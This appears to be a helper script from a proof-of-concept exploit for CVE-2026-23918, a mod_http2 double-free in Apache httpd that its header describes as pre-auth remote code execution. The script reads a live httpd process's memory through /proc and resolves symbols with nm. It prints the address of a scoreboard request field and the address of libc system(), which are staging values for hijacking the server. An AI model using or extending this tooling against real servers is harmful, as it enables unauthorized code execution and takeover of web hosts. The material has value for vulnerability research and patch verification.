#!/usr/bin/env python3
# For authorized security research and educational use only. Use only on systems you own or are explicitly authorized to test.
"""
CVE-2026-23918 - Apache httpd mod_http2 double-free, pre-auth RCE

Helper that extracts scoreboard and system() addresses from /proc/PID/mem.

Found and reported by:
  Bartlomiej Dmitruk (striga.ai)
  Stanislaw Strzalkowski (isec.pl)
"""
import struct, sys, os, re, subprocess

def read_at(pid, addr, n):
    try:
        with open(f"/proc/{pid}/mem", "rb") as f:
            f.seek(addr)
            return f.read(n)
    except (OSError, ValueError):
        return None

def u64(data, off=0):
    return struct.unpack_from("<Q", data, off)[0]

def u32(data, off=0):
    return struct.unpack_from("<I", data, off)[0]

def is_ptr(v):
    return 0x1000 < v < 0x7fffffffffff

pid = int(sys.argv[1])

def sym(pid, name):
    bases = {}
    for line in open(f"/proc/{pid}/maps"):
        p = line.split()
        if len(p) >= 6 and p[-1].startswith('/') and p[-1] not in bases:
            bases[p[-1]] = int(p[0].split('-')[0], 16)
    for path, base in bases.items():
        if not os.path.isfile(path):
            continue
        for flag in ("-D", ""):
            try:
                cmd = ["nm"] + ([flag] if flag else []) + [path]
                out = subprocess.check_output(cmd, stderr=subprocess.DEVNULL, text=True)
            except Exception:
                continue
            for ln in out.splitlines():
                t = ln.split()
                if len(t) >= 3 and t[2].split("@")[0] == name:
                    off = int(t[0], 16)
                    with open(path, 'rb') as f:
                        f.seek(16)
                        etype = struct.unpack('<H', f.read(2))[0]
                    return (base + off) if etype == 3 else off
    return None

def ptr(pid, addr):
    d = read_at(pid, addr, 8)
    return u64(d) if d else None

# worker_score.request offset (x86_64, APR_HAS_THREADS + HAVE_TIMES):
#   tid(8) + thread_num(4) + pid(4) + generation(4) + status(1) + pad(1) +
#   conn_count(2) + conn_bytes(8) + access_count(8) + bytes_served(8) +
#   my_access_count(8) + my_bytes_served(8) + start_time(8) + stop_time(8) +
#   last_used(8) + struct_tms(32) + client[32] = 0x98
OFF_WS_REQUEST = 0x98

a_sb = sym(pid, "ap_scoreboard_image")
if a_sb is not None:
    sb   = ptr(pid, a_sb)                     # scoreboard*
    srvs = ptr(pid, sb + 16) if sb else None  # servers (worker_score**)
    ws0  = ptr(pid, srvs) if srvs else None   # servers[0] (worker_score*)
    if ws0:
        req_addr = ws0 + OFF_WS_REQUEST
        print(f"scoreboard->servers[0][0].request: 0x{req_addr:x}", file=sys.stderr)
else:
    print("ap_scoreboard_image symbol not found", file=sys.stderr)

    
system_addr = sym(pid, "system")
print(f"system: 0x{system_addr:x}")
